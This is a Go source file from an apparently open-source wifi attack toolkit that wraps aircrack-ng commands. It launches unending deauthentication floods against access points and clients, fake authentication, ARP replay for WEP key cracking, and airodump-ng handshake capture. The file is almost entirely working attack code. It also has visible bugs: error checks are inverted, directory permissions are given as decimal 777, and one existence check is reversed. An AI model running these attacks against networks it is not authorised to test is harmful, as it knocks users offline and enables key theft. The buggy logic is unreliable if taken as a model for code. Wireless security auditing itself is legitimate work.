/*

   Copyright (C) 2016  DeveloppSoft <developpsoft@gmail.com>

   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 3 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software Foundation,
   Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA

*/

package AP

import (
	"errors"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	"os/exec"

	"github.com/temorfeouz/go-wifi/captures"
	"github.com/temorfeouz/go-wifi/attacks"
)

// JSON exportable structs
type (
	// AP discovered thanks to airodump-ng
	AP struct {
		Bssid   string `json:"bssid"`
		First   string `json:"first seen at"`
		Last    string `json:"last seen at"`
		Channel int    `json:"channel"`
		Speed   int    `json:"speed"`
		Privacy string `json:"privacy"`
		Cipher  string `json:"cipher"`
		Auth    string `json:"auth"`
		Power   int    `json:"power"`
		Beacons int    `json:"beacons"`
		IVs     int    `json:"ivs"`
		Lan     string `json:"lan ip"`
		IdLen   int    `json:"id len"`
		Essid   string `json:"essid"`
		Key     string `json:"key"`
		//Wps     bool   `json:"wps"`
		IsSniff bool
	}

	// Client discovered
	Client struct {
		// MAC address
		Station  string `json:"station"`
		First    string `json:"first seen at"`
		Last     string `json:"last seen at"`
		Power    int    `json:"power"`
		Packets  int    `json:"packets"`
		Bssid    string `json:"bssid"`
		Probed   string `json:"probed essids"`
		IsDeauth bool
	}
)

var captures_nb = 0

// TODO: GenKeys(): gen default keys (routerkeygen)

// DEAUTH infinitely the AP using broadcast address
func (a *AP) Deauth(iface string) (attacks.Attack, error) {
	cmd := exec.Command("aireplay-ng", "--deauth", "0", "-a", a.Bssid, iface, "--ignore-negative-one")

	err := cmd.Start() // Do not wait

	cur_atk := attacks.Attack{
		Type:    "Deauth",
		Target:  a.Bssid,
		Running: false,
		Started: time.Now().String(),
	}

	if err != nil {
		cur_atk.Running = true
		cur_atk.Init(cmd.Process)
	}

	return cur_atk, err
}

// Try a fake auth on the ap
// !! May take some time, better if runned in a goroutine
func (a *AP) FakeAuth(iface string) (bool, error) {
	cmd := exec.Command("aireplay-ng", "-1", "0", "-a", a.Bssid, "-T", "1", iface)

	output, err := cmd.Output()

	if err != nil {
		return false, err
	}

	if strings.Contains(string(output), "Association successful") {
		return true, nil
	} else {
		return false, nil
	}
}

// ARP replay!!
func (a *AP) ArpReplay(iface string) (attacks.Attack, error) {
	cmd := exec.Command("aireplay-ng", "-3", "-a", a.Bssid, iface)

	err := cmd.Start() // Do not wait

	cur_atk := attacks.Attack{
		Type:    "ArpReplay",
		Target:  a.Bssid,
		Running: false,
		Started: time.Now().String(),
	}

	if err != nil {
		cur_atk.Running = true
		cur_atk.Init(cmd.Process)
	}

	return cur_atk, err
}

var ErrAlreadySniff = errors.New("Already capture!")
var ErrAlreadyDeauth = errors.New("Already deauth!")

// Start a capture process
func (a *AP) Capture(iface string) (*attacks.Attack, *captures.Capture, error) {

	a.IsSniff = true
	// Note: I do not use a TempDir since you may want to keep the pcaps
	basePath := "wifi_capture"
	//exec.Command("rm", "-rf", basePath).Output()

	// Make a specific dir so we do not mix captures
	// TODO: change mode
	if _, err := os.Stat(basePath); os.IsNotExist(err) {
		err := os.Mkdir(basePath, 777)
		if err != nil {
			panic(err)
			return nil, nil, err
		}
	}

	path := basePath + "/" + strings.TrimSpace(a.Essid)
	if _, err := os.Stat(path); os.IsExist(err) {
		err := os.Mkdir(path, 777)
		if err != nil {
			panic(err)
			return nil, nil, err
		}
	} else {

	}

	params := []string{"-c", strconv.Itoa(a.Channel), "--bssid", a.Bssid, "-w", path + "/capture", iface, "--ignore-negative-one"}
	// log.Println(strings.Join(params, " "))
	cmd := exec.Command("airodump-ng", params...)

	err := cmd.Start() // Do not wait
	if err != nil {
		log.Println(err)
		return nil, nil, err
	}

	cur_atk := attacks.Attack{
		Type:    "Capture",
		Target:  a.Bssid,
		Running: false,
		Started: time.Now().String(),
	}

	if err == nil {
		cur_atk.Running = true
		cur_atk.Init(cmd.Process)
	}

	// Time to build the Capture
	cur_cap := captures.Capture{}
	cur_cap.Init(path, a.Privacy, a.Bssid, a.Essid)

	return &cur_atk, &cur_cap, err
}

// DEAUTH infinitely the Client
func (c *Client) Deauth(iface string) (attacks.Attack, error) {
	if c.IsDeauth == true {
		return attacks.Attack{}, ErrAlreadyDeauth
	}
	c.IsDeauth = true
	cmd := exec.Command("aireplay-ng", "-0", "0", "-a", c.Station, "-d", c.Bssid, iface)

	err := cmd.Start() // Do not wait

	cur_atk := attacks.Attack{
		Type:    "Deauth",
		Target:  c.Bssid,
		Running: false,
		Started: time.Now().String(),
	}

	if err != nil {
		cur_atk.Running = true
		cur_atk.Init(cmd.Process)
	}

	return cur_atk, err
}
